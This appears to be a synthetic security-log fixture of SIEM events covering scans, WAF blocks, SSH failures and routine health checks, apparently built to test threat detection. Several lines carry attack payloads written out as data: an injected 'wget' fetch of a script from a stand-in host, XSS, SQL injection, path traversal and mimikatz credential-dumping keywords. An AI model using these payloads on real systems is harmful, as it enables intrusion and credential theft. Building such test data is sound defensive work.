+2026-04-07T20:12:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0821.bin size=341
+2026-04-07T20:24:00 WARNING endpoint: malware indicator ransomware C2 beacon observed host=ws-0822 src=203.0.113.32
+2026-04-07T20:36:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.33 against 10.20.0823.0/24
+2026-04-07T20:48:00 EMERGENCY soc: Failed password for root from 203.0.113.34; nmap masscan SYN.flood; union select drop table users; <script>alert(1)</script>; ../etc/passwd; id; wget http://bad.example/p.sh; mimikatz lsass hashdump ntlm; ransomware C2 command.and.control token=t-0824
+2026-04-07T21:00:00 CRITICAL ids: nmap masscan scan detected from 203.0.113.35 against 10.20.0825.0/24
+2026-04-07T21:12:00 INFO app: routine health check passed host=node-0826 latency_ms=346 status=ok
+2026-04-07T21:24:00 ALERT waf: XSS attempt blocked pattern=<script>alert("x")</script> src=203.0.113.37
+2026-04-07T21:36:00 WARNING sshd: Failed password for admin from 203.0.113.38 port 348 ssh2
+2026-04-07T21:48:00 CRITICAL waf: command injection blocked payload="id; wget http://bad.example/p.sh" src=203.0.113.39
+2026-04-07T22:00:00 HIGH soc: DDoS amplification flood detected src=203.0.113.40 pps=350
+2026-04-07T22:12:00 INFO dashboard: /api/summary request served src=203.0.113.41 response_ms=351
+2026-04-07T22:24:00 INFO mailgw: message_id=<M-0832@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-07T22:36:00 CRITICAL network: ddos reflection flood and malware rootkit keylogger activity correlated attacker=203.0.113.43 campaign=camp-0833
+2026-04-07T22:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0834.bin size=354
+2026-04-07T23:00:00 INFO auth: successful login for analyst from 203.0.113.45 mfa=pass session=s-0835
+2026-04-07T23:12:00 INFO auth: successful login for analyst from 203.0.113.46 mfa=pass session=s-0836
+2026-04-07T23:24:00 INFO mailgw: message_id=<M-0837@corp.local> from=alerts@trusted-vendor.com verdict=clean
+2026-04-07T23:36:00 INFO availability: heartbeat service=threat-detector status=ok latency_ms=358
+2026-04-07T23:48:00 INFO azure-blob: upload success container=sentinel-reports blob=report-0839.bin size=359
